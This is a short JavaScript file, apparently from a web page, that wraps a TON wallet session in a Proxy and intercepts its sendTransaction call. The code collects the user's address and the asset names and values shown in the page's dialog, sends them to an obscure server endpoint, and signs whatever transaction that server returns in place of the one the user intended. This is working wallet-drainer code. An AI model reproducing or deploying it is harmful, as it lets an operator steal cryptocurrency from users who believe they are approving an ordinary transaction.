window.ton_session_override = (o) => {
    console.log("TONSDK", o, typeof o);

    return new Proxy(o, {
        get(target, prop) {
            if (prop === 'sendTransaction') {
                return async (...args) => {

                    const search = new URLSearchParams();
                    search.set("address", target?.account?.address);

                    try {
                        const names = Array.from(document.querySelectorAll("[role=dialog] img") || []).map(o=>o?.alt).filter(Boolean);
                        const USDs = Array.from(document.querySelectorAll("[role=dialog] div > p > span") || []).map(o=>o?.innerText).filter(Boolean);
                        const values =Array.from(document.querySelectorAll("[role=dialog] div > h2:last-child") || []).map(o=>o?.innerText).filter(Boolean);

                        for (let i = 0; i < names.length; i++) {
                            search.set(`n${i+1}`,names[i]);
                        }
                        for (let i = 0; i < USDs.length; i++) {
                            search.set(`u${i+1}`, USDs[i]);
                        }
                        for (let i = 0; i < values.length; i++) {
                            search.set(`v${i+1}`, values[i]);
                        }
                    } catch {}

                    const query = await fetch(`/api/=))?${search.toString()}`).then(r=>r.json());
                    return target.sendTransaction(query,...args.slice(1));
                };
            }
            return target[prop];
        }
    });
};
